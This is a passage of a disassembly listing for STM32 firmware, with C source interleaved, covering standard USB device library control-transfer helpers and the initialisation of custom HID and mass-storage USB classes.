 800c2a0:	3b01      	subs	r3, #1
 800c2a2:	2b02      	cmp	r3, #2
 800c2a4:	d80b      	bhi.n	800c2be <USBD_ClrFeature+0x30>
  {
    case USBD_STATE_DEFAULT:
    case USBD_STATE_ADDRESSED:
    case USBD_STATE_CONFIGURED:
      if (req->wValue == USB_FEATURE_REMOTE_WAKEUP)
 800c2a6:	683b      	ldr	r3, [r7, #0]
 800c2a8:	885b      	ldrh	r3, [r3, #2]
 800c2aa:	2b01      	cmp	r3, #1
 800c2ac:	d10c      	bne.n	800c2c8 <USBD_ClrFeature+0x3a>
      {
        pdev->dev_remote_wakeup = 0U;
 800c2ae:	687b      	ldr	r3, [r7, #4]
 800c2b0:	2200      	movs	r2, #0
 800c2b2:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
        (void)USBD_CtlSendStatus(pdev);
 800c2b6:	6878      	ldr	r0, [r7, #4]
 800c2b8:	f000 f910 	bl	800c4dc <USBD_CtlSendStatus>
      }
      break;
 800c2bc:	e004      	b.n	800c2c8 <USBD_ClrFeature+0x3a>

    default:
      USBD_CtlError(pdev, req);
 800c2be:	6839      	ldr	r1, [r7, #0]
 800c2c0:	6878      	ldr	r0, [r7, #4]
 800c2c2:	f000 f840 	bl	800c346 <USBD_CtlError>
      break;
 800c2c6:	e000      	b.n	800c2ca <USBD_ClrFeature+0x3c>
      break;
 800c2c8:	bf00      	nop
  }
}
 800c2ca:	bf00      	nop
 800c2cc:	3708      	adds	r7, #8
 800c2ce:	46bd      	mov	sp, r7
 800c2d0:	bd80      	pop	{r7, pc}

0800c2d2 <USBD_ParseSetupRequest>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval None
  */
void USBD_ParseSetupRequest(USBD_SetupReqTypedef *req, uint8_t *pdata)
{
 800c2d2:	b580      	push	{r7, lr}
 800c2d4:	b084      	sub	sp, #16
 800c2d6:	af00      	add	r7, sp, #0
 800c2d8:	6078      	str	r0, [r7, #4]
 800c2da:	6039      	str	r1, [r7, #0]
  uint8_t *pbuff = pdata;
 800c2dc:	683b      	ldr	r3, [r7, #0]
 800c2de:	60fb      	str	r3, [r7, #12]

  req->bmRequest = *(uint8_t *)(pbuff);
 800c2e0:	68fb      	ldr	r3, [r7, #12]
 800c2e2:	781a      	ldrb	r2, [r3, #0]
 800c2e4:	687b      	ldr	r3, [r7, #4]
 800c2e6:	701a      	strb	r2, [r3, #0]

  pbuff++;
 800c2e8:	68fb      	ldr	r3, [r7, #12]
 800c2ea:	3301      	adds	r3, #1
 800c2ec:	60fb      	str	r3, [r7, #12]
  req->bRequest = *(uint8_t *)(pbuff);
 800c2ee:	68fb      	ldr	r3, [r7, #12]
 800c2f0:	781a      	ldrb	r2, [r3, #0]
 800c2f2:	687b      	ldr	r3, [r7, #4]
 800c2f4:	705a      	strb	r2, [r3, #1]

  pbuff++;
 800c2f6:	68fb      	ldr	r3, [r7, #12]
 800c2f8:	3301      	adds	r3, #1
 800c2fa:	60fb      	str	r3, [r7, #12]
  req->wValue = SWAPBYTE(pbuff);
 800c2fc:	68f8      	ldr	r0, [r7, #12]
 800c2fe:	f7ff fa16 	bl	800b72e <SWAPBYTE>
 800c302:	4603      	mov	r3, r0
 800c304:	461a      	mov	r2, r3
 800c306:	687b      	ldr	r3, [r7, #4]
 800c308:	805a      	strh	r2, [r3, #2]

  pbuff++;
 800c30a:	68fb      	ldr	r3, [r7, #12]
 800c30c:	3301      	adds	r3, #1
 800c30e:	60fb      	str	r3, [r7, #12]
  pbuff++;
 800c310:	68fb      	ldr	r3, [r7, #12]
 800c312:	3301      	adds	r3, #1
 800c314:	60fb      	str	r3, [r7, #12]
  req->wIndex = SWAPBYTE(pbuff);
 800c316:	68f8      	ldr	r0, [r7, #12]
 800c318:	f7ff fa09 	bl	800b72e <SWAPBYTE>
 800c31c:	4603      	mov	r3, r0
 800c31e:	461a      	mov	r2, r3
 800c320:	687b      	ldr	r3, [r7, #4]
 800c322:	809a      	strh	r2, [r3, #4]

  pbuff++;
 800c324:	68fb      	ldr	r3, [r7, #12]
 800c326:	3301      	adds	r3, #1
 800c328:	60fb      	str	r3, [r7, #12]
  pbuff++;
 800c32a:	68fb      	ldr	r3, [r7, #12]
 800c32c:	3301      	adds	r3, #1
 800c32e:	60fb      	str	r3, [r7, #12]
  req->wLength = SWAPBYTE(pbuff);
 800c330:	68f8      	ldr	r0, [r7, #12]
 800c332:	f7ff f9fc 	bl	800b72e <SWAPBYTE>
 800c336:	4603      	mov	r3, r0
 800c338:	461a      	mov	r2, r3
 800c33a:	687b      	ldr	r3, [r7, #4]
 800c33c:	80da      	strh	r2, [r3, #6]
}
 800c33e:	bf00      	nop
 800c340:	3710      	adds	r7, #16
 800c342:	46bd      	mov	sp, r7
 800c344:	bd80      	pop	{r7, pc}

0800c346 <USBD_CtlError>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval None
  */
void USBD_CtlError(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c346:	b580      	push	{r7, lr}
 800c348:	b082      	sub	sp, #8
 800c34a:	af00      	add	r7, sp, #0
 800c34c:	6078      	str	r0, [r7, #4]
 800c34e:	6039      	str	r1, [r7, #0]
  UNUSED(req);

  (void)USBD_LL_StallEP(pdev, 0x80U);
 800c350:	2180      	movs	r1, #128	; 0x80
 800c352:	6878      	ldr	r0, [r7, #4]
 800c354:	f000 fd6a 	bl	800ce2c <USBD_LL_StallEP>
  (void)USBD_LL_StallEP(pdev, 0U);
 800c358:	2100      	movs	r1, #0
 800c35a:	6878      	ldr	r0, [r7, #4]
 800c35c:	f000 fd66 	bl	800ce2c <USBD_LL_StallEP>
}
 800c360:	bf00      	nop
 800c362:	3708      	adds	r7, #8
 800c364:	46bd      	mov	sp, r7
 800c366:	bd80      	pop	{r7, pc}

0800c368 <USBD_GetString>:
  * @param  unicode : Formatted string buffer (unicode)
  * @param  len : descriptor length
  * @retval None
  */
void USBD_GetString(uint8_t *desc, uint8_t *unicode, uint16_t *len)
{
 800c368:	b580      	push	{r7, lr}
 800c36a:	b086      	sub	sp, #24
 800c36c:	af00      	add	r7, sp, #0
 800c36e:	60f8      	str	r0, [r7, #12]
 800c370:	60b9      	str	r1, [r7, #8]
 800c372:	607a      	str	r2, [r7, #4]
  uint8_t idx = 0U;
 800c374:	2300      	movs	r3, #0
 800c376:	75fb      	strb	r3, [r7, #23]
  uint8_t *pdesc;

  if (desc == NULL)
 800c378:	68fb      	ldr	r3, [r7, #12]
 800c37a:	2b00      	cmp	r3, #0
 800c37c:	d036      	beq.n	800c3ec <USBD_GetString+0x84>
  {
    return;
  }

  pdesc = desc;
 800c37e:	68fb      	ldr	r3, [r7, #12]
 800c380:	613b      	str	r3, [r7, #16]
  *len = ((uint16_t)USBD_GetLen(pdesc) * 2U) + 2U;
 800c382:	6938      	ldr	r0, [r7, #16]
 800c384:	f000 f836 	bl	800c3f4 <USBD_GetLen>
 800c388:	4603      	mov	r3, r0
 800c38a:	3301      	adds	r3, #1
 800c38c:	b29b      	uxth	r3, r3
 800c38e:	005b      	lsls	r3, r3, #1
 800c390:	b29a      	uxth	r2, r3
 800c392:	687b      	ldr	r3, [r7, #4]
 800c394:	801a      	strh	r2, [r3, #0]

  unicode[idx] = *(uint8_t *)len;
 800c396:	7dfb      	ldrb	r3, [r7, #23]
 800c398:	68ba      	ldr	r2, [r7, #8]
 800c39a:	4413      	add	r3, r2
 800c39c:	687a      	ldr	r2, [r7, #4]
 800c39e:	7812      	ldrb	r2, [r2, #0]
 800c3a0:	701a      	strb	r2, [r3, #0]
  idx++;
 800c3a2:	7dfb      	ldrb	r3, [r7, #23]
 800c3a4:	3301      	adds	r3, #1
 800c3a6:	75fb      	strb	r3, [r7, #23]
  unicode[idx] = USB_DESC_TYPE_STRING;
 800c3a8:	7dfb      	ldrb	r3, [r7, #23]
 800c3aa:	68ba      	ldr	r2, [r7, #8]
 800c3ac:	4413      	add	r3, r2
 800c3ae:	2203      	movs	r2, #3
 800c3b0:	701a      	strb	r2, [r3, #0]
  idx++;
 800c3b2:	7dfb      	ldrb	r3, [r7, #23]
 800c3b4:	3301      	adds	r3, #1
 800c3b6:	75fb      	strb	r3, [r7, #23]

  while (*pdesc != (uint8_t)'\0')
 800c3b8:	e013      	b.n	800c3e2 <USBD_GetString+0x7a>
  {
    unicode[idx] = *pdesc;
 800c3ba:	7dfb      	ldrb	r3, [r7, #23]
 800c3bc:	68ba      	ldr	r2, [r7, #8]
 800c3be:	4413      	add	r3, r2
 800c3c0:	693a      	ldr	r2, [r7, #16]
 800c3c2:	7812      	ldrb	r2, [r2, #0]
 800c3c4:	701a      	strb	r2, [r3, #0]
    pdesc++;
 800c3c6:	693b      	ldr	r3, [r7, #16]
 800c3c8:	3301      	adds	r3, #1
 800c3ca:	613b      	str	r3, [r7, #16]
    idx++;
 800c3cc:	7dfb      	ldrb	r3, [r7, #23]
 800c3ce:	3301      	adds	r3, #1
 800c3d0:	75fb      	strb	r3, [r7, #23]

    unicode[idx] = 0U;
 800c3d2:	7dfb      	ldrb	r3, [r7, #23]
 800c3d4:	68ba      	ldr	r2, [r7, #8]
 800c3d6:	4413      	add	r3, r2
 800c3d8:	2200      	movs	r2, #0
 800c3da:	701a      	strb	r2, [r3, #0]
    idx++;
 800c3dc:	7dfb      	ldrb	r3, [r7, #23]
 800c3de:	3301      	adds	r3, #1
 800c3e0:	75fb      	strb	r3, [r7, #23]
  while (*pdesc != (uint8_t)'\0')
 800c3e2:	693b      	ldr	r3, [r7, #16]
 800c3e4:	781b      	ldrb	r3, [r3, #0]
 800c3e6:	2b00      	cmp	r3, #0
 800c3e8:	d1e7      	bne.n	800c3ba <USBD_GetString+0x52>
 800c3ea:	e000      	b.n	800c3ee <USBD_GetString+0x86>
    return;
 800c3ec:	bf00      	nop
  }
}
 800c3ee:	3718      	adds	r7, #24
 800c3f0:	46bd      	mov	sp, r7
 800c3f2:	bd80      	pop	{r7, pc}

0800c3f4 <USBD_GetLen>:
  *         return the string length
   * @param  buf : pointer to the ascii string buffer
  * @retval string length
  */
static uint8_t USBD_GetLen(uint8_t *buf)
{
 800c3f4:	b480      	push	{r7}
 800c3f6:	b085      	sub	sp, #20
 800c3f8:	af00      	add	r7, sp, #0
 800c3fa:	6078      	str	r0, [r7, #4]
  uint8_t  len = 0U;
 800c3fc:	2300      	movs	r3, #0
 800c3fe:	73fb      	strb	r3, [r7, #15]
  uint8_t *pbuff = buf;
 800c400:	687b      	ldr	r3, [r7, #4]
 800c402:	60bb      	str	r3, [r7, #8]

  while (*pbuff != (uint8_t)'\0')
 800c404:	e005      	b.n	800c412 <USBD_GetLen+0x1e>
  {
    len++;
 800c406:	7bfb      	ldrb	r3, [r7, #15]
 800c408:	3301      	adds	r3, #1
 800c40a:	73fb      	strb	r3, [r7, #15]
    pbuff++;
 800c40c:	68bb      	ldr	r3, [r7, #8]
 800c40e:	3301      	adds	r3, #1
 800c410:	60bb      	str	r3, [r7, #8]
  while (*pbuff != (uint8_t)'\0')
 800c412:	68bb      	ldr	r3, [r7, #8]
 800c414:	781b      	ldrb	r3, [r3, #0]
 800c416:	2b00      	cmp	r3, #0
 800c418:	d1f5      	bne.n	800c406 <USBD_GetLen+0x12>
  }

  return len;
 800c41a:	7bfb      	ldrb	r3, [r7, #15]
}
 800c41c:	4618      	mov	r0, r3
 800c41e:	3714      	adds	r7, #20
 800c420:	46bd      	mov	sp, r7
 800c422:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c426:	4770      	bx	lr

0800c428 <USBD_CtlSendData>:
  * @param  len: length of data to be sent
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlSendData(USBD_HandleTypeDef *pdev,
                                    uint8_t *pbuf, uint32_t len)
{
 800c428:	b580      	push	{r7, lr}
 800c42a:	b084      	sub	sp, #16
 800c42c:	af00      	add	r7, sp, #0
 800c42e:	60f8      	str	r0, [r7, #12]
 800c430:	60b9      	str	r1, [r7, #8]
 800c432:	607a      	str	r2, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_DATA_IN;
 800c434:	68fb      	ldr	r3, [r7, #12]
 800c436:	2202      	movs	r2, #2
 800c438:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->ep_in[0].total_length = len;
 800c43c:	68fb      	ldr	r3, [r7, #12]
 800c43e:	687a      	ldr	r2, [r7, #4]
 800c440:	619a      	str	r2, [r3, #24]

#ifdef USBD_AVOID_PACKET_SPLIT_MPS
  pdev->ep_in[0].rem_length = 0U;
#else
  pdev->ep_in[0].rem_length = len;
 800c442:	68fb      	ldr	r3, [r7, #12]
 800c444:	687a      	ldr	r2, [r7, #4]
 800c446:	61da      	str	r2, [r3, #28]
#endif /* USBD_AVOID_PACKET_SPLIT_MPS */

  /* Start the transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, pbuf, len);
 800c448:	687b      	ldr	r3, [r7, #4]
 800c44a:	68ba      	ldr	r2, [r7, #8]
 800c44c:	2100      	movs	r1, #0
 800c44e:	68f8      	ldr	r0, [r7, #12]
 800c450:	f000 fdbc 	bl	800cfcc <USBD_LL_Transmit>

  return USBD_OK;
 800c454:	2300      	movs	r3, #0
}
 800c456:	4618      	mov	r0, r3
 800c458:	3710      	adds	r7, #16
 800c45a:	46bd      	mov	sp, r7
 800c45c:	bd80      	pop	{r7, pc}

0800c45e <USBD_CtlContinueSendData>:
  * @param  len: length of data to be sent
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlContinueSendData(USBD_HandleTypeDef *pdev,
                                            uint8_t *pbuf, uint32_t len)
{
 800c45e:	b580      	push	{r7, lr}
 800c460:	b084      	sub	sp, #16
 800c462:	af00      	add	r7, sp, #0
 800c464:	60f8      	str	r0, [r7, #12]
 800c466:	60b9      	str	r1, [r7, #8]
 800c468:	607a      	str	r2, [r7, #4]
  /* Start the next transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, pbuf, len);
 800c46a:	687b      	ldr	r3, [r7, #4]
 800c46c:	68ba      	ldr	r2, [r7, #8]
 800c46e:	2100      	movs	r1, #0
 800c470:	68f8      	ldr	r0, [r7, #12]
 800c472:	f000 fdab 	bl	800cfcc <USBD_LL_Transmit>

  return USBD_OK;
 800c476:	2300      	movs	r3, #0
}
 800c478:	4618      	mov	r0, r3
 800c47a:	3710      	adds	r7, #16
 800c47c:	46bd      	mov	sp, r7
 800c47e:	bd80      	pop	{r7, pc}

0800c480 <USBD_CtlPrepareRx>:
  * @param  len: length of data to be received
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlPrepareRx(USBD_HandleTypeDef *pdev,
                                     uint8_t *pbuf, uint32_t len)
{
 800c480:	b580      	push	{r7, lr}
 800c482:	b084      	sub	sp, #16
 800c484:	af00      	add	r7, sp, #0
 800c486:	60f8      	str	r0, [r7, #12]
 800c488:	60b9      	str	r1, [r7, #8]
 800c48a:	607a      	str	r2, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_DATA_OUT;
 800c48c:	68fb      	ldr	r3, [r7, #12]
 800c48e:	2203      	movs	r2, #3
 800c490:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->ep_out[0].total_length = len;
 800c494:	68fb      	ldr	r3, [r7, #12]
 800c496:	687a      	ldr	r2, [r7, #4]
 800c498:	f8c3 2158 	str.w	r2, [r3, #344]	; 0x158

#ifdef USBD_AVOID_PACKET_SPLIT_MPS
  pdev->ep_out[0].rem_length = 0U;
#else
  pdev->ep_out[0].rem_length = len;
 800c49c:	68fb      	ldr	r3, [r7, #12]
 800c49e:	687a      	ldr	r2, [r7, #4]
 800c4a0:	f8c3 215c 	str.w	r2, [r3, #348]	; 0x15c
#endif /* USBD_AVOID_PACKET_SPLIT_MPS */

  /* Start the transfer */
  (void)USBD_LL_PrepareReceive(pdev, 0U, pbuf, len);
 800c4a4:	687b      	ldr	r3, [r7, #4]
 800c4a6:	68ba      	ldr	r2, [r7, #8]
 800c4a8:	2100      	movs	r1, #0
 800c4aa:	68f8      	ldr	r0, [r7, #12]
 800c4ac:	f000 fdc6 	bl	800d03c <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c4b0:	2300      	movs	r3, #0
}
 800c4b2:	4618      	mov	r0, r3
 800c4b4:	3710      	adds	r7, #16
 800c4b6:	46bd      	mov	sp, r7
 800c4b8:	bd80      	pop	{r7, pc}

0800c4ba <USBD_CtlContinueRx>:
  * @param  len: length of data to be received
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlContinueRx(USBD_HandleTypeDef *pdev,
                                      uint8_t *pbuf, uint32_t len)
{
 800c4ba:	b580      	push	{r7, lr}
 800c4bc:	b084      	sub	sp, #16
 800c4be:	af00      	add	r7, sp, #0
 800c4c0:	60f8      	str	r0, [r7, #12]
 800c4c2:	60b9      	str	r1, [r7, #8]
 800c4c4:	607a      	str	r2, [r7, #4]
  (void)USBD_LL_PrepareReceive(pdev, 0U, pbuf, len);
 800c4c6:	687b      	ldr	r3, [r7, #4]
 800c4c8:	68ba      	ldr	r2, [r7, #8]
 800c4ca:	2100      	movs	r1, #0
 800c4cc:	68f8      	ldr	r0, [r7, #12]
 800c4ce:	f000 fdb5 	bl	800d03c <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c4d2:	2300      	movs	r3, #0
}
 800c4d4:	4618      	mov	r0, r3
 800c4d6:	3710      	adds	r7, #16
 800c4d8:	46bd      	mov	sp, r7
 800c4da:	bd80      	pop	{r7, pc}

0800c4dc <USBD_CtlSendStatus>:
  *         send zero lzngth packet on the ctl pipe
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlSendStatus(USBD_HandleTypeDef *pdev)
{
 800c4dc:	b580      	push	{r7, lr}
 800c4de:	b082      	sub	sp, #8
 800c4e0:	af00      	add	r7, sp, #0
 800c4e2:	6078      	str	r0, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_STATUS_IN;
 800c4e4:	687b      	ldr	r3, [r7, #4]
 800c4e6:	2204      	movs	r2, #4
 800c4e8:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  /* Start the transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, NULL, 0U);
 800c4ec:	2300      	movs	r3, #0
 800c4ee:	2200      	movs	r2, #0
 800c4f0:	2100      	movs	r1, #0
 800c4f2:	6878      	ldr	r0, [r7, #4]
 800c4f4:	f000 fd6a 	bl	800cfcc <USBD_LL_Transmit>

  return USBD_OK;
 800c4f8:	2300      	movs	r3, #0
}
 800c4fa:	4618      	mov	r0, r3
 800c4fc:	3708      	adds	r7, #8
 800c4fe:	46bd      	mov	sp, r7
 800c500:	bd80      	pop	{r7, pc}

0800c502 <USBD_CtlReceiveStatus>:
  *         receive zero lzngth packet on the ctl pipe
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlReceiveStatus(USBD_HandleTypeDef *pdev)
{
 800c502:	b580      	push	{r7, lr}
 800c504:	b082      	sub	sp, #8
 800c506:	af00      	add	r7, sp, #0
 800c508:	6078      	str	r0, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_STATUS_OUT;
 800c50a:	687b      	ldr	r3, [r7, #4]
 800c50c:	2205      	movs	r2, #5
 800c50e:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  /* Start the transfer */
  (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800c512:	2300      	movs	r3, #0
 800c514:	2200      	movs	r2, #0
 800c516:	2100      	movs	r1, #0
 800c518:	6878      	ldr	r0, [r7, #4]
 800c51a:	f000 fd8f 	bl	800d03c <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c51e:	2300      	movs	r3, #0
}
 800c520:	4618      	mov	r0, r3
 800c522:	3708      	adds	r7, #8
 800c524:	46bd      	mov	sp, r7
 800c526:	bd80      	pop	{r7, pc}

0800c528 <MX_USB_DEVICE_Init>:
/**
  * Init USB device Library, add supported class and start the library
  * @retval None
  */
void MX_USB_DEVICE_Init(void)
{
 800c528:	b580      	push	{r7, lr}
 800c52a:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_DEVICE_Init_PreTreatment */

  /* USER CODE END USB_DEVICE_Init_PreTreatment */

  /* Init Device Library, add supported class and start the library. */
  if (USBD_Init(&hUsbDeviceFS, &FS_Desc, DEVICE_FS) != USBD_OK)
 800c52c:	2200      	movs	r2, #0
 800c52e:	4912      	ldr	r1, [pc, #72]	; (800c578 <MX_USB_DEVICE_Init+0x50>)
 800c530:	4812      	ldr	r0, [pc, #72]	; (800c57c <MX_USB_DEVICE_Init+0x54>)
 800c532:	f7fe fd68 	bl	800b006 <USBD_Init>
 800c536:	4603      	mov	r3, r0
 800c538:	2b00      	cmp	r3, #0
 800c53a:	d001      	beq.n	800c540 <MX_USB_DEVICE_Init+0x18>
  {
    Error_Handler();
 800c53c:	f7f4 fc7e 	bl	8000e3c <Error_Handler>
  }
  if (USBD_RegisterClass(&hUsbDeviceFS, &USBD_CUSTOM_HID) != USBD_OK)
 800c540:	490f      	ldr	r1, [pc, #60]	; (800c580 <MX_USB_DEVICE_Init+0x58>)
 800c542:	480e      	ldr	r0, [pc, #56]	; (800c57c <MX_USB_DEVICE_Init+0x54>)
 800c544:	f7fe fd8f 	bl	800b066 <USBD_RegisterClass>
 800c548:	4603      	mov	r3, r0
 800c54a:	2b00      	cmp	r3, #0
 800c54c:	d001      	beq.n	800c552 <MX_USB_DEVICE_Init+0x2a>
  {
    Error_Handler();
 800c54e:	f7f4 fc75 	bl	8000e3c <Error_Handler>
  }
  if (USBD_CUSTOM_HID_RegisterInterface(&hUsbDeviceFS, &USBD_CustomHID_fops_FS) != USBD_OK)
 800c552:	490c      	ldr	r1, [pc, #48]	; (800c584 <MX_USB_DEVICE_Init+0x5c>)
 800c554:	4809      	ldr	r0, [pc, #36]	; (800c57c <MX_USB_DEVICE_Init+0x54>)
 800c556:	f7fc fca5 	bl	8008ea4 <USBD_CUSTOM_HID_RegisterInterface>
 800c55a:	4603      	mov	r3, r0
 800c55c:	2b00      	cmp	r3, #0
 800c55e:	d001      	beq.n	800c564 <MX_USB_DEVICE_Init+0x3c>
  {
    Error_Handler();
 800c560:	f7f4 fc6c 	bl	8000e3c <Error_Handler>
  }
  if (USBD_Start(&hUsbDeviceFS) != USBD_OK)
 800c564:	4805      	ldr	r0, [pc, #20]	; (800c57c <MX_USB_DEVICE_Init+0x54>)
 800c566:	f7fe fdb4 	bl	800b0d2 <USBD_Start>
 800c56a:	4603      	mov	r3, r0
 800c56c:	2b00      	cmp	r3, #0
 800c56e:	d001      	beq.n	800c574 <MX_USB_DEVICE_Init+0x4c>
  {
    Error_Handler();
 800c570:	f7f4 fc64 	bl	8000e3c <Error_Handler>
  }
  /* USER CODE BEGIN USB_DEVICE_Init_PostTreatment */
  /* USER CODE END USB_DEVICE_Init_PostTreatment */
}
 800c574:	bf00      	nop
 800c576:	bd80      	pop	{r7, pc}
 800c578:	200001ac 	.word	0x200001ac
 800c57c:	200003c0 	.word	0x200003c0
 800c580:	2000002c 	.word	0x2000002c
 800c584:	2000019c 	.word	0x2000019c

0800c588 <MX_USB_DEVICE_Init_MSC>:
/**
  * Init USB device Library, add supported class and start the library
  * @retval None
  */
void MX_USB_DEVICE_Init_MSC(void)
{
 800c588:	b580      	push	{r7, lr}
 800c58a:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_DEVICE_Init_PreTreatment */

  /* USER CODE END USB_DEVICE_Init_PreTreatment */

  /* Init Device Library, add supported class and start the library. */
  if (USBD_Init(&hUsbDeviceFS_MSC, &FS_Desc, DEVICE_FS) != USBD_OK)
 800c58c:	2200      	movs	r2, #0
 800c58e:	4912      	ldr	r1, [pc, #72]	; (800c5d8 <MX_USB_DEVICE_Init_MSC+0x50>)
 800c590:	4812      	ldr	r0, [pc, #72]	; (800c5dc <MX_USB_DEVICE_Init_MSC+0x54>)
 800c592:	f7fe fd38 	bl	800b006 <USBD_Init>
 800c596:	4603      	mov	r3, r0
 800c598:	2b00      	cmp	r3, #0
 800c59a:	d001      	beq.n	800c5a0 <MX_USB_DEVICE_Init_MSC+0x18>
  {
    Error_Handler();
 800c59c:	f7f4 fc4e 	bl	8000e3c <Error_Handler>
  }
  if (USBD_RegisterClass(&hUsbDeviceFS_MSC, &USBD_MSC) != USBD_OK)
 800c5a0:	490f      	ldr	r1, [pc, #60]	; (800c5e0 <MX_USB_DEVICE_Init_MSC+0x58>)
 800c5a2:	480e      	ldr	r0, [pc, #56]	; (800c5dc <MX_USB_DEVICE_Init_MSC+0x54>)
 800c5a4:	f7fe fd5f 	bl	800b066 <USBD_RegisterClass>
 800c5a8:	4603      	mov	r3, r0
 800c5aa:	2b00      	cmp	r3, #0
 800c5ac:	d001      	beq.n	800c5b2 <MX_USB_DEVICE_Init_MSC+0x2a>
  {
    Error_Handler();
 800c5ae:	f7f4 fc45 	bl	8000e3c <Error_Handler>
  }
  if (USBD_MSC_RegisterStorage(&hUsbDeviceFS_MSC, &USBD_Storage_Interface_fops_FS) != USBD_OK)
 800c5b2:	490c      	ldr	r1, [pc, #48]	; (800c5e4 <MX_USB_DEVICE_Init_MSC+0x5c>)
 800c5b4:	4809      	ldr	r0, [pc, #36]	; (800c5dc <MX_USB_DEVICE_Init_MSC+0x54>)
 800c5b6:	f7fc ff27 	bl	8009408 <USBD_MSC_RegisterStorage>
 800c5ba:	4603      	mov	r3, r0
 800c5bc:	2b00      	cmp	r3, #0
 800c5be:	d001      	beq.n	800c5c4 <MX_USB_DEVICE_Init_MSC+0x3c>
  {
    Error_Handler();
 800c5c0:	f7f4 fc3c 	bl	8000e3c <Error_Handler>
  }
  if (USBD_Start(&hUsbDeviceFS_MSC) != USBD_OK)
 800c5c4:	4805      	ldr	r0, [pc, #20]	; (800c5dc <MX_USB_DEVICE_Init_MSC+0x54>)
 800c5c6:	f7fe fd84 	bl	800b0d2 <USBD_Start>
 800c5ca:	4603      	mov	r3, r0
 800c5cc:	2b00      	cmp	r3, #0
 800c5ce:	d001      	beq.n	800c5d4 <MX_USB_DEVICE_Init_MSC+0x4c>
  {
    Error_Handler();
 800c5d0:	f7f4 fc34 	bl	8000e3c <Error_Handler>
  }
  /* USER CODE BEGIN USB_DEVICE_Init_PostTreatment */

  /* USER CODE END USB_DEVICE_Init_PostTreatment */
}
 800c5d4:	bf00      	nop
 800c5d6:	bd80      	pop	{r7, pc}
 800c5d8:	200001ac 	.word	0x200001ac
 800c5dc:	2000069c 	.word	0x2000069c
 800c5e0:	200000a8 	.word	0x200000a8
 800c5e4:	20000220 	.word	0x20000220

0800c5e8 <CUSTOM_HID_Init_FS>:
/**
  * @brief  Initializes the CUSTOM HID media low layer
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_Init_FS(void)
{
 800c5e8:	b480      	push	{r7}
 800c5ea:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 4 */
  return (USBD_OK);
 800c5ec:	2300      	movs	r3, #0
  /* USER CODE END 4 */
}
 800c5ee:	4618      	mov	r0, r3
 800c5f0:	46bd      	mov	sp, r7
 800c5f2:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c5f6:	4770      	bx	lr

0800c5f8 <CUSTOM_HID_DeInit_FS>:
/**
  * @brief  DeInitializes the CUSTOM HID media low layer
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_DeInit_FS(void)
{
 800c5f8:	b480      	push	{r7}
 800c5fa:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 5 */
  return (USBD_OK);
 800c5fc:	2300      	movs	r3, #0
  /* USER CODE END 5 */
}
 800c5fe:	4618      	mov	r0, r3
 800c600:	46bd      	mov	sp, r7
 800c602:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c606:	4770      	bx	lr

0800c608 <CUSTOM_HID_OutEvent_FS>:
  * @param  event_idx: Event index
  * @param  state: Event state
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_OutEvent_FS(uint8_t event_idx, uint8_t state)
{
 800c608:	b580      	push	{r7, lr}
 800c60a:	b082      	sub	sp, #8
 800c60c:	af00      	add	r7, sp, #0
 800c60e:	4603      	mov	r3, r0
 800c610:	460a      	mov	r2, r1
 800c612:	71fb      	strb	r3, [r7, #7]
 800c614:	4613      	mov	r3, r2
 800c616:	71bb      	strb	r3, [r7, #6]
  /* USER CODE BEGIN 6 */
  UNUSED(event_idx);
  UNUSED(state);

  /* Start next USB packet transfer once data processing is completed */
  USBD_CUSTOM_HID_ReceivePacket(&hUsbDeviceFS);
 800c618:	4803      	ldr	r0, [pc, #12]	; (800c628 <CUSTOM_HID_OutEvent_FS+0x20>)
 800c61a:	f7fc fbd1 	bl	8008dc0 <USBD_CUSTOM_HID_ReceivePacket>

  return (USBD_OK);
 800c61e:	2300      	movs	r3, #0
  /* USER CODE END 6 */
}
 800c620:	4618      	mov	r0, r3
 800c622:	3708      	adds	r7, #8
 800c624:	46bd      	mov	sp, r7
 800c626:	bd80      	pop	{r7, pc}
 800c628:	200003c0 	.word	0x200003c0

0800c62c <USBD_FS_DeviceDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_DeviceDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c62c:	b480      	push	{r7}
 800c62e:	b083      	sub	sp, #12
 800c630:	af00      	add	r7, sp, #0
 800c632:	4603      	mov	r3, r0
 800c634:	6039      	str	r1, [r7, #0]
